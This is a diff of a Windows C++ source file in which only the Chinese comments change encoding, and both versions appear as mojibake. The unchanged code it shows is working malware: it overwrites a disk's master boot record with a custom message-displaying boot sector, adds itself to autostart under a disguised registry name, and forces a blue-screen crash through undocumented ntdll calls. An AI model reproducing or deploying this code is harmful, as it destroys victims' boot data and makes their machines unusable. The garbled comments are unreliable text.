@@ -1,22 +1,19 @@
-#include"std.h"
+ï»¿#include"std.h"
 
 using namespace std;
-//×Ô¶¨ÒåMBR
 
 
-
-
-
+//è‡ªå®šä¹‰MBR
 void GetPrivileges()
 {
-	//¶¨ÒåÒ»¸öPLUID
+	//å®šä¹‰ä¸€ä¸ªPLUID
 	HANDLE hProcess;
 	HANDLE hTokenHandle;
 	TOKEN_PRIVILEGES tp;
-	hProcess = GetCurrentProcess();//»ñÈ¡µ±Ç°½ø³ÌµÄ¾ä±ú
+	hProcess = GetCurrentProcess();//è·å–å½“å‰è¿›ç¨‹çš„å¥æŸ„
 
 	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
-	//º¯Êı²é¿´ÏµÍ³È¨ÏŞµÄÌØÈ¨Öµ£¬·µ»ØĞÅÏ¢µ½Ò»¸öLUID½á¹¹ÌåÀï¡£
+	//å‡½æ•°æŸ¥çœ‹ç³»ç»Ÿæƒé™çš„ç‰¹æƒå€¼ï¼Œè¿”å›ä¿¡æ¯åˆ°ä¸€ä¸ªLUIDç»“æ„ä½“é‡Œã€‚
 	tp.PrivilegeCount = 1;
 	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
@@ -26,54 +23,54 @@ void GetPrivileges()
 
 }
 
-//Ğ´MBR
+//å†™MBR
 bool WritePhydriveMBR(unsigned int id,string msgstr)
 {
 	#pragma warning(push)
 	#pragma warning (disable:4309 4838)
-	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*×Ö·ûÎ»Êı*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
+	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*å­—ç¬¦ä½æ•°*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
 	#pragma warning(pop)
 	static bool isfirstuse=true;
 	if (isfirstuse)//
 	{
-		//³õÊ¼»¯MBR
+		//åˆå§‹åŒ–MBR
 		
-		//¸ÄMBRÖĞ×Ö·ûÎ»Êı
+		//æ”¹MBRä¸­å­—ç¬¦ä½æ•°
 		pMBR[9] = static_cast<char>(msgstr.size());
-		//¼ÓÑ­»·Âß¼­Ëø¡ª¡ª¡ª¡ªÒÑÆúÓÃ£¡£¡£¡½öWin9xÏÂÓĞĞ§¹û£¡£¡£¡
+		//åŠ å¾ªç¯é€»è¾‘é”â€”â€”â€”â€”å·²å¼ƒç”¨ï¼ï¼ï¼ä»…Win9xä¸‹æœ‰æ•ˆæœï¼ï¼ï¼
 		//pMBR[0x1BF] = 0x00;
 		//pMBR[0x1C2] = 0x05;
-		//¼Ó½áÎ²
+		//åŠ ç»“å°¾
 		pMBR[510] = static_cast<char>(0x55);
 		pMBR[511] = static_cast<char>(0xAA);
-		//°ÑÌáÊ¾×Ö·ûĞ´ÈëMBR
+		//æŠŠæç¤ºå­—ç¬¦å†™å…¥MBR
 		strcpy_s(reinterpret_cast<char *>(pMBR + 24), 512, msgstr.c_str());
 	}
 
-	//¼ÆËãÓ²ÅÌÎÄ¼şÃû³Æ
+	//è®¡ç®—ç¡¬ç›˜æ–‡ä»¶åç§°
 	wstringstream wss;
 	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
-	//´ò¿ª
+	//æ‰“å¼€
 	HANDLE hFile;
 	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	//ÓÃreadfileÀ´¶ÁÈ¡MBR
+	//ç”¨readfileæ¥è¯»å–MBR
 	bool retn = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
 	CloseHandle(hFile);
 	return retn;
 }
 
-//¶ÁMBR
+//è¯»MBR
 string ReadPhydriveMBR(unsigned int id)
 {
 	
 	char pMBR[512] = {};
 	wstringstream wss;
-	//¼ÆËãÓ²ÅÌÎÄ¼şÃû³Æ
+	//è®¡ç®—ç¡¬ç›˜æ–‡ä»¶åç§°
 	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
-	//´ò¿ª
+	//æ‰“å¼€
 	HANDLE hFile;
 	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	//ÓÃreadfileÀ´¶ÁÈ¡MBR
+	//ç”¨readfileæ¥è¯»å–MBR
 	DWORD dwReadSize;
 	
 	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
@@ -85,33 +82,33 @@ string ReadPhydriveMBR(unsigned int id)
 }
 
 
-//×¢²á×ÔÆô¶¯
+//æ³¨å†Œè‡ªå¯åŠ¨
 void RegAutoStart()
 {
 	HKEY hKey;
 	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-	//1¡¢ÕÒµ½ÏµÍ³µÄÆô¶¯Ïî  
-	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///´ò¿ªÆô¶¯Ïî       
+	//1ã€æ‰¾åˆ°ç³»ç»Ÿçš„å¯åŠ¨é¡¹  
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///æ‰“å¼€å¯åŠ¨é¡¹       
 	{
-		//2¡¢µÃµ½±¾³ÌĞò×ÔÉíµÄÈ«Â·¾¶
+		//2ã€å¾—åˆ°æœ¬ç¨‹åºè‡ªèº«çš„å…¨è·¯å¾„
 		TCHAR strExeFullDir[MAX_PATH];
 		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
-		//3¡¢ÅĞ¶Ï×¢²á±íÏîÊÇ·ñÒÑ¾­´æÔÚ
+		//3ã€åˆ¤æ–­æ³¨å†Œè¡¨é¡¹æ˜¯å¦å·²ç»å­˜åœ¨
 		TCHAR strDir[MAX_PATH] = {};
 		DWORD nLength = MAX_PATH;
 		long result = RegGetValue(hKey, nullptr, _T("yhy3daigamestudio"), RRF_RT_REG_SZ, 0, strDir, &nLength);
-		//4¡¢ÒÑ¾­´æÔÚ
+		//4ã€å·²ç»å­˜åœ¨
 		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
 		{
-			//5¡¢Ìí¼ÓÒ»¸ö×ÓKey,²¢ÉèÖÃÖµ
+			//5ã€æ·»åŠ ä¸€ä¸ªå­Key,å¹¶è®¾ç½®å€¼
 			RegSetValueEx(hKey, _T("yhy3daigamestudio"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR));
-			//6¡¢¹Ø±Õ×¢²á±í
+			//6ã€å…³é—­æ³¨å†Œè¡¨
 			RegCloseKey(hKey);
 		}
 	}
 }
 
-//À¶ÆÁº¯Êı
+//è“å±å‡½æ•°
 void MakeBlueScreen(unsigned int errid)
 {
 	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
@@ -119,7 +116,7 @@ void MakeBlueScreen(unsigned int errid)
 	{
 		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
-		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//»ñÈ¡À¶ÆÁº¯Êı
+		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//è·å–è“å±å‡½æ•°
 		unsigned char ErrKill;
 		long unsigned int HDErr;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
